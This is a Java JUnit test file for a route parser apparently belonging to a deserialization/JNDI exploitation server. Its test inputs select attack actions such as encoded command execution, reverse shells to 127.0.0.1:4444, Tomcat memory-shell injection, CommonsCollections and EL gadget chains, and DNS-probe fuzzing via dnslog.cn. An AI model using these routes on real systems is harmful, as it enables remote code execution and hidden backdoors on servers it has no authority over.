package com.bloom.parser;

import org.junit.Test;
import static org.junit.Assert.*;

public class RouteParserTest {

    private final RouteParser parser = new RouteParser();

    @Test
    public void testBasicCommand() {
        ParsedRoute route = parser.parse("basic/open -a calculator");
        assertTrue(route.isValid());
        assertEquals(RouteType.BASIC, route.getRouteType());
        assertEquals(ActionType.COMMAND, route.getActionType());
        assertEquals("open -a calculator", route.getCommand());
    }

    @Test
    public void testBasicBase64() {
        ParsedRoute route = parser.parse("basic/base64/b3BlbiAtYSBjYWxjdWxhdG9y");
        assertTrue(route.isValid());
        assertEquals(RouteType.BASIC, route.getRouteType());
        assertEquals(ActionType.COMMAND, route.getActionType());
        assertEquals("open -a calculator", route.getCommand());
    }

    @Test
    public void testBasicReverseShell() {
        ParsedRoute route = parser.parse("basic/reverseshell/127.0.0.1/4444");
        assertTrue(route.isValid());
        assertEquals(RouteType.BASIC, route.getRouteType());
        assertEquals(ActionType.REVERSE_SHELL, route.getActionType());
        assertTrue(route.getCommand().contains("127.0.0.1"));
        assertTrue(route.getCommand().contains("4444"));
    }

    @Test
    public void testBasicReverseShell2() {
        ParsedRoute route = parser.parse("basic/reverseshell2/127.0.0.1/4444");
        assertTrue(route.isValid());
        assertEquals(RouteType.BASIC, route.getRouteType());
        assertEquals(ActionType.REVERSE_SHELL, route.getActionType());
    }

    @Test
    public void testBasicMemshell() {
        ParsedRoute route = parser.parse("basic/memshell/TomcatFilterMemShellFromThread");
        assertTrue(route.isValid());
        assertEquals(RouteType.BASIC, route.getRouteType());
        assertEquals(ActionType.MEMSHELL, route.getActionType());
        assertEquals("CLASS:TomcatFilterMemShellFromThread", route.getCommand());
    }

    @Test
    public void testBasicMemshellFile() {
        ParsedRoute route = parser.parse("basic/memshell/FILE:data/exploit.class");
        assertTrue(route.isValid());
        assertEquals(RouteType.BASIC, route.getRouteType());
        assertEquals(ActionType.MEMSHELL, route.getActionType());
        assertEquals("FILE:data/exploit.class", route.getCommand());
    }

    @Test
    public void testURLDNS() {
        ParsedRoute route = parser.parse("URLDNS/dnslog.cn");
        assertTrue(route.isValid());
        assertEquals(RouteType.GADGET, route.getRouteType());
        assertEquals(ActionType.DNS_PROBE, route.getActionType());
        assertEquals("dnslog.cn", route.getCommand());
    }

    @Test
    public void testGadgetBase64() {
        ParsedRoute route = parser.parse("EL/base64/b3BlbiAtYSBjYWxjdWxhdG9y");
        assertTrue(route.isValid());
        assertEquals(RouteType.GADGET, route.getRouteType());
        assertEquals(ActionType.COMMAND, route.getActionType());
        assertEquals("open -a calculator", route.getCommand());
    }

    @Test
    public void testGadgetReverseShell() {
        ParsedRoute route = parser.parse("EL/reverseshell/127.0.0.1/4444");
        assertTrue(route.isValid());
        assertEquals(RouteType.GADGET, route.getRouteType());
        assertEquals(ActionType.REVERSE_SHELL, route.getActionType());
    }

    @Test
    public void testGadgetMemshell() {
        ParsedRoute route = parser.parse("EL/memshell/tomcatmemshell1");
        assertTrue(route.isValid());
        assertEquals(RouteType.GADGET, route.getRouteType());
        assertEquals(ActionType.MEMSHELL, route.getActionType());
        assertEquals("CLASS:tomcatmemshell1", route.getCommand());
    }

    @Test
    public void testFuzz() {
        ParsedRoute route = parser.parse("fuzz/EL/dnslog.cn");
        assertTrue(route.isValid());
        assertEquals(RouteType.FUZZ, route.getRouteType());
        assertEquals(ActionType.DNS_PROBE, route.getActionType());
        assertEquals("EL", route.getPayloadType());
        assertEquals("dnslog.cn", route.getCommand());
    }

    @Test
    public void testFuzzByDNS() {
        ParsedRoute route = parser.parse("fuzzbyDNS/dnslog.cn");
        assertTrue(route.isValid());
        assertEquals(RouteType.FUZZ_BY_DNS, route.getRouteType());
        assertEquals(ActionType.DNS_PROBE, route.getActionType());
        assertEquals("dnslog.cn", route.getCommand());
    }

    @Test
    public void testNullInput() {
        ParsedRoute route = parser.parse(null);
        assertFalse(route.isValid());
        assertFalse(route.getValidationErrors().isEmpty());
    }

    @Test
    public void testEmptyInput() {
        ParsedRoute route = parser.parse("");
        assertFalse(route.isValid());
        assertFalse(route.getValidationErrors().isEmpty());
    }

    @Test
    public void testInvalidFormat() {
        ParsedRoute route = parser.parse("invalid");
        assertFalse(route.isValid());
        assertFalse(route.getValidationErrors().isEmpty());
    }

    @Test
    public void testCommonsCollectionsMemshell() {
        ParsedRoute route = parser.parse("CommonsCollections1/memshell/TomcatFilterMemShellFromThread");
        assertTrue(route.isValid());
        assertEquals(RouteType.GADGET, route.getRouteType());
        assertEquals(ActionType.MEMSHELL, route.getActionType());
    }

    @Test
    public void testRiskLevels() {
        assertEquals(RiskLevel.LOW, ActionType.DNS_PROBE.getRiskLevel());
        assertEquals(RiskLevel.HIGH, ActionType.COMMAND.getRiskLevel());
        assertEquals(RiskLevel.CRITICAL, ActionType.REVERSE_SHELL.getRiskLevel());
        assertEquals(RiskLevel.CRITICAL, ActionType.MEMSHELL.getRiskLevel());
    }
}
